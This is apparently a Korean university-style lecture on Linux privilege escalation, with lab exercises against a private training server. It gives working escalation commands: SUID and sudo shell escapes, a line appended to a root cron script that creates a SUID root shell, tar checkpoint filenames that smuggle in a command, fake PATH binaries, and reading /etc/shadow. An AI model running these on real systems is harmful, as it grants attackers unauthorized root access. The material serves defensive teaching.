# Week 11: 권한 상승 (Linux Privilege Escalation)

## 학습 목표

- Linux 권한 모델(사용자, 그룹, 퍼미션)을 이해한다
- SUID 바이너리를 이용한 권한 상승 원리를 설명할 수 있다
- sudo 설정 오류를 통한 권한 상승 방법을 실습한다
- Cron job과 PATH 하이재킹의 위험성을 이해한다
- 커널 익스플로잇의 개념을 설명할 수 있다

---

## 1. Linux 권한 모델 복습

### 1.1 사용자와 권한

```bash
# 현재 사용자 확인
whoami         # → user
id             # → uid=1000(user) gid=1000(user) groups=1000(user),27(sudo)

# 파일 권한 확인
ls -la /etc/passwd
# -rw-r--r-- 1 root root 1234 Mar 27 10:00 /etc/passwd
#  │││ │││ │││
#  │││ │││ └└└ 기타 사용자: 읽기만 가능
#  │││ └└└ 그룹: 읽기만 가능
#  └└└ 소유자: 읽기+쓰기
```

### 1.2 특수 퍼미션

| 비트 | 숫자 | 이름 | 효과 |
|------|------|------|------|
| `s` (소유자) | 4000 | SUID | 실행 시 파일 소유자 권한으로 실행 |
| `s` (그룹) | 2000 | SGID | 실행 시 파일 그룹 권한으로 실행 |
| `t` | 1000 | Sticky | 디렉토리 내 파일 삭제 시 소유자만 가능 |

**SUID가 위험한 이유:**
```
일반 실행:   user가 실행 → user 권한으로 동작
SUID 실행:   user가 실행 → root 권한으로 동작 (파일 소유자가 root일 때)
```

---

## 2. SUID 바이너리를 이용한 권한 상승

### 2.1 SUID 바이너리 찾기

```bash
# SUID가 설정된 모든 파일 검색
find / -perm -4000 -type f 2>/dev/null

# 일반적인 SUID 바이너리 (정상):
# /usr/bin/passwd      → 패스워드 변경 (shadow 파일 수정 필요)
# /usr/bin/sudo        → sudo 명령어
# /usr/bin/mount       → 파일시스템 마운트
# /usr/bin/ping        → ICMP 소켓 생성

# 위험한 SUID 바이너리 (비정상):
# /usr/bin/find        → -exec로 임의 명령 실행 가능
# /usr/bin/vim         → :!sh로 쉘 실행 가능
# /usr/bin/python3     → 파이썬으로 쉘 실행 가능
# /usr/bin/nmap        → --interactive로 쉘 가능
```

### 2.2 GTFOBins

GTFOBins(https://gtfobins.github.io)는 SUID/sudo 등으로 권한 상승이 가능한 바이너리 목록이다.

**주요 SUID 악용 예시:**

```bash
# find가 SUID인 경우
find /tmp -name "*.txt" -exec /bin/sh -p \;
# → root 쉘 획득

# vim이 SUID인 경우
vim -c ':!/bin/sh'
# → vim 내에서 root 쉘 실행

# python3이 SUID인 경우
python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
# → root 쉘 획득

# bash가 SUID인 경우
bash -p
# → -p 옵션: 실효 UID를 유지 (SUID 활용)

# cp가 SUID인 경우
# /etc/passwd를 수정하여 root 비밀번호 추가 가능
```

---

## 3. sudo 설정 오류

### 3.1 sudo 권한 확인

```bash
# 현재 사용자의 sudo 권한 확인
sudo -l

# 예시 출력:
# User user may run the following commands on web:
#     (ALL) NOPASSWD: ALL
```

### 3.2 위험한 sudo 설정 예시

```
# /etc/sudoers 파일의 위험한 설정들

# 모든 명령을 비밀번호 없이 실행 가능 (매우 위험)
user ALL=(ALL) NOPASSWD: ALL

# 특정 명령만 허용했지만 우회 가능한 경우
user ALL=(root) NOPASSWD: /usr/bin/vim
user ALL=(root) NOPASSWD: /usr/bin/less
user ALL=(root) NOPASSWD: /usr/bin/find
user ALL=(root) NOPASSWD: /usr/bin/awk
user ALL=(root) NOPASSWD: /usr/bin/python3
user ALL=(root) NOPASSWD: /usr/bin/env
```

### 3.3 sudo를 통한 권한 상승

```bash
# vim으로 root 쉘
sudo vim -c ':!/bin/sh'

# less로 root 쉘
sudo less /etc/passwd
# less 내에서 !sh 입력

# find로 root 쉘
sudo find /tmp -exec /bin/sh \;

# awk로 root 쉘
sudo awk 'BEGIN {system("/bin/sh")}'

# python3으로 root 쉘
sudo python3 -c 'import os; os.system("/bin/sh")'

# env로 root 쉘
sudo env /bin/sh

# ALL이 허용된 경우 (가장 단순)
sudo su -
sudo /bin/bash
```

---

## 4. Cron Job 악용

### 4.1 Cron Job이란?

cron은 Linux에서 예약된 작업을 주기적으로 실행하는 시스템 데몬이다.

```bash
# cron 작업 확인 방법들
crontab -l                      # 현재 사용자의 cron
sudo crontab -l                 # root의 cron
ls -la /etc/cron.d/             # 시스템 cron 디렉토리
ls -la /etc/cron.daily/         # 매일 실행되는 스크립트
cat /etc/crontab                # 시스템 crontab
```

### 4.2 Cron Job 악용 시나리오

**시나리오: root가 실행하는 스크립트에 쓰기 권한이 있는 경우**

```bash
# 1. root의 cron 작업 발견
cat /etc/crontab
# * * * * * root /opt/scripts/backup.sh

# 2. 스크립트 퍼미션 확인
ls -la /opt/scripts/backup.sh
# -rwxrwxrwx 1 root root 234 ...  ← 모든 사용자가 쓰기 가능!

# 3. 스크립트에 리버스 쉘 추가
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /opt/scripts/backup.sh

# 4. cron이 실행되면 (최대 1분 대기)
/tmp/rootbash -p
# → root 쉘 획득
```

### 4.3 Cron 와일드카드 악용

```bash
# root cron이 다음을 실행하는 경우:
# * * * * * root cd /tmp/backup && tar czf /opt/backup.tar.gz *

# tar의 --checkpoint 옵션을 악용
echo "" > "/tmp/backup/--checkpoint=1"
echo "" > "/tmp/backup/--checkpoint-action=exec=sh shell.sh"
echo "cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash" > /tmp/backup/shell.sh
```

---

## 5. PATH 하이재킹

### 5.1 PATH 환경 변수

```bash
# PATH 확인
echo $PATH
# /usr/local/bin:/usr/bin:/bin:/usr/local/sbin:/usr/sbin:/sbin

# 명령어 실행 시 PATH 순서대로 검색
which ls
# /usr/bin/ls
```

### 5.2 PATH 하이재킹 원리

SUID 바이너리나 root cron 스크립트가 절대 경로 없이 명령어를 실행하는 경우:

```bash
# 예: /opt/scripts/status.sh (SUID root 또는 root cron)
#!/bin/bash
echo "=== System Status ==="
date           # ← 절대 경로 없이 date 호출
ps aux         # ← 절대 경로 없이 ps 호출
```

**악용 방법:**

```bash
# 1. 가짜 명령어 생성
echo '#!/bin/bash' > /tmp/date
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /tmp/date
chmod +x /tmp/date

# 2. PATH를 조작하여 /tmp를 먼저 검색하게 함
export PATH=/tmp:$PATH

# 3. 스크립트 실행 시 /tmp/date가 실행됨
/opt/scripts/status.sh

# 4. root 쉘 획득
/tmp/rootbash -p
```

---

## 6. 커널 익스플로잇 개요

### 6.1 커널 익스플로잇이란?

Linux 커널의 취약점을 이용하여 root 권한을 획득하는 공격이다. 최후의 수단으로 사용한다.

### 6.2 유명한 커널 취약점

| 취약점 | CVE | 영향 버전 | 설명 |
|--------|-----|-----------|------|
| Dirty COW | CVE-2016-5195 | Linux < 4.8.3 | Copy-on-Write 경합 조건 |
| Dirty Pipe | CVE-2022-0847 | Linux 5.8~5.16.11 | 파이프 버퍼 덮어쓰기 |
| PwnKit | CVE-2021-4034 | polkit < 0.120 | pkexec 메모리 손상 |
| GameOver(lay) | CVE-2023-2640 | Ubuntu 커널 | OverlayFS 권한 상승 |

### 6.3 커널 버전 확인

```bash
# 커널 버전 확인
uname -r
# 예: 5.15.0-91-generic

# 전체 시스템 정보
uname -a
# Linux web 5.15.0-91-generic #101-Ubuntu SMP...

# OS 배포판 확인
cat /etc/os-release
```

> **주의**: 커널 익스플로잇은 시스템 불안정을 유발할 수 있다. 실제 침투 테스트에서는 클라이언트와 사전 협의 후에만 사용한다.

---

## 7. 실습

### 실습 환경

| 서버 | IP | 접속 정보 | 특이사항 |
|------|-----|-----------|---------|
| web | 10.20.30.80 | user:web, pw:1 | sudo NOPASSWD:ALL |

### 실습 1: web 서버 접속 및 기본 정보 수집

```bash
# web 서버 SSH 접속
sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.80

# 현재 사용자 정보
whoami
# 예상 출력: user

id
# 예상 출력: uid=1000(user) gid=1000(user) groups=1000(user),27(sudo)

# 커널 버전 확인
uname -r
# 예상 출력: 5.15.0-xx-generic (또는 유사)

# OS 정보
cat /etc/os-release | head -5
```

### 실습 2: SUID 바이너리 검색

```bash
# web 서버에서 SUID 바이너리 검색
sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.80 \
  "find / -perm -4000 -type f 2>/dev/null"

# 예상 출력:
# /usr/bin/passwd
# /usr/bin/sudo
# /usr/bin/mount
# /usr/bin/umount
# /usr/bin/su
# /usr/bin/newgrp
# /usr/bin/chfn
# /usr/bin/chsh
# /usr/bin/gpasswd
# /usr/lib/openssh/ssh-keysign
# /usr/lib/dbus-1.0/dbus-daemon-launch-helper

# SGID 바이너리도 검색
sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.80 \
  "find / -perm -2000 -type f 2>/dev/null"

# 결과를 정리하고, GTFOBins에서 악용 가능한 바이너리가 있는지 확인
```

### 실습 3: sudo 권한 확인 및 악용

```bash
# sudo 권한 확인
sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.80 "echo 1 | sudo -S -l"

# 예상 출력:
# User user may run the following commands on web:
#     (ALL) NOPASSWD: ALL

# sudo로 root 쉘 획득
sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.80 "sudo whoami"
# 예상 출력: root

# root로 중요 파일 확인
sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.80 "sudo cat /etc/shadow | head -3"
# 예상 출력:
# root:$6$...:19000:0:99999:7:::
# daemon:*:19000:0:99999:7:::
# bin:*:19000:0:99999:7:::
```

### 실습 4: Cron Job 확인

```bash
# 시스템 crontab 확인
sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.80 \
  "cat /etc/crontab"

# root의 cron 작업 확인
sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.80 \
  "sudo crontab -l 2>/dev/null || echo 'root cron 없음'"

# cron 디렉토리 확인
sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.80 \
  "ls -la /etc/cron.d/ /etc/cron.daily/ 2>/dev/null"

# 쓰기 가능한 스크립트 찾기
sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.80 \
  "find /etc/cron* -writable 2>/dev/null"
```

### 실습 5: PATH 하이재킹 시연

이 실습에서는 PATH 하이재킹의 원리를 안전하게 시연한다.

```bash
# web 서버 접속
sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.80

# 1. 현재 PATH 확인
echo $PATH

# 2. 테스트용 스크립트 생성 (절대 경로 없이 ls 호출)
cat > /tmp/test_script.sh << 'SCRIPT'
#!/bin/bash
echo "=== 파일 목록 ==="
ls /tmp
SCRIPT
chmod +x /tmp/test_script.sh

# 3. 가짜 ls 생성
cat > /tmp/ls << 'FAKE'
#!/bin/bash
echo "[!] PATH 하이재킹 성공! 가짜 ls가 실행되었습니다."
echo "[!] 실제 공격에서는 여기서 악성 코드가 실행됩니다."
# 원래 ls도 실행 (정상 동작 위장)
/usr/bin/ls "$@"
FAKE
chmod +x /tmp/ls

# 4. PATH 조작
export PATH=/tmp:$PATH

# 5. 스크립트 실행 → 가짜 ls가 실행됨
/tmp/test_script.sh

# 예상 출력:
# === 파일 목록 ===
# [!] PATH 하이재킹 성공! 가짜 ls가 실행되었습니다.
# [!] 실제 공격에서는 여기서 악성 코드가 실행됩니다.
# test_script.sh  ls  ...

# 6. 정리 (실습 후 반드시)
rm /tmp/ls /tmp/test_script.sh
export PATH=$(echo $PATH | sed 's|/tmp:||')
```

### 실습 6: 종합 권한 상승 체크리스트 실행

```bash
# web 서버에서 한 번에 체크하는 스크립트
sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.80 << 'CHECK'
echo "===== 1. 현재 사용자 ====="
whoami && id

echo ""
echo "===== 2. 커널 버전 ====="
uname -r

echo ""
echo "===== 3. sudo 권한 ====="
echo 1 | sudo -S -l 2>/dev/null

echo ""
echo "===== 4. SUID 바이너리 ====="
find / -perm -4000 -type f 2>/dev/null

echo ""
echo "===== 5. 쓰기 가능한 /etc 파일 ====="
find /etc -writable -type f 2>/dev/null | head -10

echo ""
echo "===== 6. Cron Jobs ====="
cat /etc/crontab 2>/dev/null
ls -la /etc/cron.d/ 2>/dev/null

echo ""
echo "===== 7. 실행 중인 프로세스 (root) ====="
ps aux | grep "^root" | head -10

echo ""
echo "===== 8. 네트워크 서비스 ====="
ss -tlnp 2>/dev/null | head -10
CHECK
```

---

## 8. 방어 방법

| 공격 벡터 | 방어 방법 |
|-----------|-----------|
| SUID 남용 | 불필요한 SUID 제거, 정기 감사 |
| sudo 오설정 | 최소 권한 원칙, NOPASSWD 제한 |
| Cron 악용 | 스크립트 퍼미션 제한 (750), 절대 경로 사용 |
| PATH 하이재킹 | 스크립트에서 절대 경로 사용 |
| 커널 익스플로잇 | 정기적 커널 업데이트 |

---

## 9. 실습 과제

1. **SUID 감사 보고서**: web 서버의 SUID 바이너리 목록을 수집하고, GTFOBins를 참조하여 악용 가능한 바이너리를 분류하라.
2. **권한 상승 경로 문서화**: web 서버에서 일반 사용자(user)가 root 권한을 획득할 수 있는 모든 경로를 나열하라.
3. **방어 제안서**: 발견된 각 취약점에 대한 구체적인 수정 방법을 제시하라.

---

## 10. 핵심 정리

- 권한 상승은 침투 테스트에서 초기 접근 후 가장 중요한 단계이다
- SUID, sudo, cron, PATH 순서로 체계적으로 점검한다
- `sudo -l`은 가장 먼저 확인해야 할 명령어이다
- 모든 공격의 방어는 **최소 권한 원칙**에서 시작한다

**다음 주 예고**: Week 12에서는 권한 상승 후 지속성을 확보하고 흔적을 제거하는 기법을 학습한다.
